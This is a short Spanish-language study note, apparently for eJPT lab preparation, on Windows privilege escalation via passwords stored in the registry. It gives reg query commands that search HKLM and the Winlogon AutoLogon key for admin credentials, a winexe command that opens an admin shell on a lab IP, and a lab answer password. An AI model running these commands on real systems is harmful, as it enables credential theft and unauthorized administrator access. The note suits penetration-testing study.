(Por alguna razón a veces la contraseña no se almacena en el registro. Si este es el caso, use lo siguiente como respuesta: contraseña123)  

- Se puede buscar en el registro las claves y valores que contienen la palabra "contraseña":

```
reg query HKLM /f password /t REG_SZ /s
```

- Si desea ahorrar algo de tiempo, consulte esta clave específica para encontrar las credenciales de administrador de AutoLogon:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

- En Kali, use el comando winexe para generar un símbolo del sistema que se ejecuta con los privilegios de administrador (actualice la contraseña con la que encontró):

```
winexe -U 'admin%password' //10.10.226.103 cmd.exe
```


enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Passwords - Passing the Hash]]
[[Passwords - Saved Creds]]
[[Passwords - Security Account Manager (SAM)]]
[[Generate a Reverse Shell Executable]]


